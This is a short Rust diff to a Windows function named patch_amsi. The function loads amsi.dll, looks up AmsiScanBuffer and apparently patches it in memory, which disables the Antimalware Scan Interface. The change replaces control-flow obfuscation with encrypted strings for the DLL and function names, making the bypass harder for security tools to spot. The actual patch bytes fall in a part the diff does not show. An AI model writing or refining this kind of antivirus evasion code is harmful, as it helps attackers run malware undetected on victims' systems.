@@ -1,4 +1,4 @@
-use encstr::{cobl, opaque_false};
+use encstr::astr;
 use std::ffi::CString;
 use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
 use windows::Win32::System::Memory::{
@@ -7,15 +7,11 @@ use windows::Win32::System::Memory::{
 use windows::core::PCSTR;
 
 pub fn patch_amsi() {
-    cobl!({
-    if opaque_false() {
-        return;
-    }
-    let dll_name = match CString::new("amsi.dll") {
+    let dll_name = match CString::new(astr!("amsi.dll")) {
         Ok(n) => n,
         Err(_) => return,
     };
-    let fn_name = match CString::new("AmsiScanBuffer") {
+    let fn_name = match CString::new(astr!("AmsiScanBuffer")) {
         Ok(n) => n,
         Err(_) => return,
     };
@@ -64,5 +60,4 @@ pub fn patch_amsi() {
             );
         }
     }
-    })
 }
